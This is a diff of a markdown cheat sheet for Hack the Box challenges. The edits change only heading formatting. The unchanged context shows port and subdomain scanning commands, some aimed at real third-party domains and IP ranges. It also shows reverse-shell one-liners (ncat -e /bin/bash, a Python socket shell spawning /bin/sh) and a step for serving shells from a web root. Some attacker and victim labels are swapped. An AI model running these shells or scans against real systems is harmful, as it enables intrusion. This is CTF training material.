@@ -1,7 +1,7 @@
 ## Hack the Box Reference.<br>
 ***<h2>Contains commands,Link and tricks for challenges</h2>***<br>
 ***COMMON COMMANDS***<br>
-***Nmap ***<br>
+**Nmap**<br>
 •	nmap -sV -p 1-20000  -iL input.txt -oN output.txt<br>
 **masscan probe to establish the open ports in the host.**<br>
 •	masscan -e tun0 -p1-65535,U:1-65535 10.10.10.101 --rate=700<br>
@@ -9,17 +9,17 @@
 **nmap scanning the discovered ports to see what are the services.**<br>
 •	nmap -sV -v -O -sS -T5 {target}<br>
 
-***Subfinder(only subfinder can run large wordlist)***<br>
+**Subfinder(only subfinder can run large wordlist)**<br>
 •	./subfinder -d freelancer.com -o output.txt<br>
-***Eyewitness***<br>
+**Eyewitness**<br>
 •	./EyeWitness.py --headless -f hunchly_dark.txt -d output_dir1 --prepend-https <br>
 •	./EyeWitness.py --web --thread 50 -f hunchly_dark.txt -d output_dir1 --prepend-https<br>
 •	dnscan.py -d ubnt.com -w /SecLists/Discovery/DNS/bitquark_subdomains_top100K.txt -t 30 -o D_ubnt.txt<br>
 •	masscan -p80,443,8080,9090,8081, 66.211.168.0/22 > mass_paypal.txt<br>
 •	gobuster -m dns -u target.com -w $wordlist<br>
-***installing tab completion***<br>
+**installing tab completion**<br>
 •	apt-get install bash-completion<br>
-***Untar***<br>
+**Untar**<br>
 •	tar -xvf sqlmap.tar.gz<br>
 •	gzip -d file.gz<br>
 •	tcpdump port 9009<br>
@@ -31,14 +31,14 @@
 •	./parameth.py -u TARGET<br>
 •	python linkfinder.py -i https://example.com/1.js -o results.html<br>
 
-***list all file in a directory with permission***<br>
+**list all file in a directory with permission**<br>
 ls -l /home<br>
 In the above it is listing all files of home directory with permissions<br>
-***list all files with hidden with permission***<br>
+**list all files with hidden with permission**<br>
 ls -al<br>
-***show permission of directory or file***<br>
+**show permission of directory or file**<br>
 ls -ld<br>
-***REVERSE SHELL***<br>
+**REVERSE SHELL**<br>
 
 Victim: ncat -e /bin/bash {IP} {PORT}<br>
 Attacker: Machine:nc -lvnp {PORT}<br>
@@ -52,7 +52,7 @@ Victim:nc -lvp 4444 <br>
 Attacker:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
 Victim:nc -lvp 1234<br>
 
-***File transfer during REVERSE SHELL***<br>
+**File transfer during REVERSE SHELL**<br>
 Attacker: service apache2 start<br>
 place shell or exploit in /var/www/html<br>
 
